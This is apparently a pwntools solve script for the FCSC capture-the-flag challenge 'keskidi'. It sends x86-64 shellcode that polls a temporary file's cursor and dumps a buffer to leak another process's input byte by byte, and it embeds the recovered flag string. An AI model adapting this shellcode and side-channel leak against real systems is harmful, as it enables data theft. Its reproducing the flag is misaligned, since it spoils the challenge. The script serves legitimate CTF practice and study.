#!/usr/bin/python3
from pwn import *

HOST = "challenges.france-cybersecurity-challenge.fr"
PORT = 2103
CHALL = "./keskidi"

LOCAL = not args.REMOTE
context.binary = CHALL


def start():
    global p, TMP_FD
    if LOCAL:
        TMP_FD = 4
        if not args.GDB:
            p = process(CHALL)
        else :
            p = gdb.debug(CHALL)
    else:
        TMP_FD = 6
        p = remote(HOST, PORT)

def loop_printtmp():
    loop_printtmp = asm(
    f"""
    push rbp
    mov rbp, rsp
    sub rsp, 0x1010
    mov rax, [rbp + 0x8]
    sub rax, 0x13c0
    mov [rbp-0x8], rax      #base of the image

    .loop:
    /* lseek to 0 */
    mov rdx, 0
    mov rsi, 0
    mov rdi, {TMP_FD}
    mov rax, 8
    syscall

    /*
    read tmp file content
    */
    mov rdx, 0x100
    lea rsi, [rbp-0x1010]
    mov rdi, 4
    mov rax, 0
    syscall

    /* write file content */
    mov rdi, 1
    mov rax, 1
    syscall
    jmp .loop

    leave
    ret
    """)

def attack_buf_first():
    global p
    start()
    shellcode = asm(f"""
    push rbp
    mov rbp, rsp
    sub rsp, 0x10
    

    /* write bigbuf */
    mov rdx, 0x1000
    mov rax, [rbp + 0x8]
    lea rsi, [rax + 0x2ca0]
    mov rdi, 1
    mov rax, 1
    syscall

    .loop:
    /* get cursor position */
    mov rdx, 1
    mov rsi, 0
    mov rdi, {TMP_FD}
    mov rax, 8
    syscall

    /* print cursor position */
    mov [rbp-0x10], rax
    mov rdx, 8
    lea rsi, [rbp-0x10]
    mov rdi, 1
    mov rax, 1
    syscall

    jmp .loop

    leave
    ret
    """)

    if len(shellcode) > 0x100:
        print(f"Shellcode too long : {len(shellcode)}") 
        exit()

    p.sendline(shellcode)
    bigbuf = p.recvn(0x1000)
    #print(bigbuf.hex())
    print("-------------")
    cursor = 4096
    flagb = []
    flagb_off = []
    cur_byte = None
    while cursor == 4096:
        cursor = u64(p.recvn(8))
    while cur_byte != ord("}"):
        new_cursor = u64(p.recvn(8)) -1
        new_byte = bigbuf[new_cursor]
        if new_byte != cur_byte or new_cursor < cursor:
            cur_byte = new_byte
            flagb.append(new_byte)
        cursor = new_cursor
        #print(cursor)
    #print([hex(u64(stack[i*8:(i+1)*8])) for i in range(len(stack)//8)])
    p.close()
    print(bytes(flagb))

def attack_bufend():
    global p
    start()
    shellcode = asm(f"""
    push rbp
    mov rbp, rsp
    sub rsp, 0x10

    mov rbx, 20000

    .loop:
    dec rbx
    jz .exit
    /* get cursor position */
    mov rdx, 1
    mov rsi, 0
    mov rdi, {TMP_FD}
    mov rax, 8
    syscall

    /* print cursor position */
    mov [rbp-0x10], rax
    mov rdx, 8
    lea rsi, [rbp-0x10]
    mov rdi, 1
    mov rax, 1
    syscall

    jmp .loop

    .exit:
    /* write bigbuf */
    mov rdx, 0x1000
    mov rax, [rbp + 0x8]
    lea rsi, [rax + 0x2ca0]
    mov rdi, 1
    mov rax, 1
    syscall

    leave
    ret
    """)

    if len(shellcode) > 0x100:
        print(f"Shellcode too long : {len(shellcode)}") 
        exit()

    p.sendline(shellcode)
    content = p.recvall(timeout=3)
    #print(content.hex())
    p.close()
    print(u64(content[0:8]))
    bigbuf = content[len(content) - 4096:]
    #print(bigbuf.hex())
    print("-------------")
    cursor = 4096
    flagb = []
    flagb_off = []
    cur_byte = None
    i = 0
    while cursor == 4096:
        i += 8
        cursor = u64(content[i:i+8])
    cursor = 0
    while i+8 < len(content) - 4096:
        new_cursor = u64(content[i:i+8]) -1
        new_byte = bigbuf[new_cursor]
        if new_byte != cur_byte or new_cursor < cursor:
            cur_byte = new_byte
            flagb.append(new_byte)
        cursor = new_cursor
        i += 8
        #print(cursor)
    #print([hex(u64(stack[i*8:(i+1)*8])) for i in range(len(stack)//8)])
    print(bytes(flagb))

def check_fd():
    global p
    start()
    shellcode = asm("""
    push rbp
    mov rbp, rsp
    sub rsp, 0x10
    mov rax, [rbp + 0x8]
    sub rax, 0x13c0
    mov [rbp-0x8], rax      #base of the image

    /* print file descriptor */
    mov [rbp-0x10], rax
    mov rdx, 4
    mov rsi, [rbp-0x8]
    lea rsi, [rsi+0x4040]
    mov rdi, 1
    mov rax, 1
    syscall

    leave
    ret
    """)

    p.sendline(shellcode)
    print(p.recvall())

#attack_bufend()
#attack_buf_first()

def flag_match():
    attempt = "FCSC{5cda7f51ba4724231c8eb5a29c970423b73a7d462e3075ed39ec3ab5d3fbc4e8}"
    assert (len(attempt) == 70)
    chunks = """
    C5caf51b474231c8e5a9c9043b73a7d46e37ed39e3a5d3fbce8}
                13c8b5a29c9742b73ad462375d39e3b5dfc48}
    d751ba424231c8b5a9c970423b73a7d462e3075ed39e3ab5d3fbc48}
    5a7f1ba47242318b52c97043b73a7d42375d39c3ab53fb48}
        df51ba7421c8b5a2997423737d462e307ed39c3a5d3bce8}
    Ccda751ba47431c8eba9c97043b73ad46e375ed39c3ab5d3fbc4e8}
    a751ba4724231c8eb529c70423b737d462e3075ed3e3ab53be8}
        5472421c8eb5a29c97043b73a7d462e3075ed39ec3ab5dfc4e8}
    b423c8eba2c7043b73742e3075e3ec3b5dfbc48}
    caf1a474231c8eb529c9043b73a7d462e3075ed39ec3abd3fbc4e8}
    F7fba72231ceb5a2997042b73ad6e07ed39e3b5d3fb48}
    Cf1ba4724318eb529c970423b737d4623075ed39ec3b5d3fbc4e8}
    """.split("\n")
    for chunk in chunks:
        chunk = chunk.strip()
        i = 0
        j = 0
        while i < 70 and j < len(chunk):
            if chunk[j] == attempt[i]:
                j += 1
            i += 1
        print(i, j)
        print(chunk)
        assert j == len(chunk)

flag_match()